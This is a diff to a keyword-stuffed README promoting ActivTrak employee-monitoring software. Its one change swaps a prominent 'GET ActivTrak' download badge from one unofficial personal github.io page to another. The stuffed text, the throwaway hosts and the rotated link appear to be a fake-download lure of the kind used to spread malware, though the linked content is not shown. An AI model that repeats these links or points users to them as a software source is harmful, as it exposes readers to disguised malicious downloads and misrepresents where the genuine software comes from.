@@ -50,7 +50,7 @@ For teams comparing activtrak software, activtrak review resources, or activtrak
 
 Prerequisites: A company workspace, administrator access, a defined monitoring policy, and a plan for communicating ActivTrak employee monitoring goals to users.
 
-[![GET ActivTrak](https://img.shields.io/badge/GET%20%E2%80%94%20ActivTrak-0078D6?style=for-the-badge&logoColor=white)](https://kianrobleseber.github.io/.github/activtrak-software)
+[![GET ActivTrak](https://img.shields.io/badge/GET%20%E2%80%94%20ActivTrak-0078D6?style=for-the-badge&logoColor=white)](https://nathanklineqiks.github.io/.github/activtrak-software)
 
 1.  **Download and Install:** Use ActivTrak download resources to install the ActivTrak agent on approved devices and connect them to your workspace.
 2.  **Account Access:** Complete activtrak login setup for administrators and assign permissions based on the people who need reporting access.
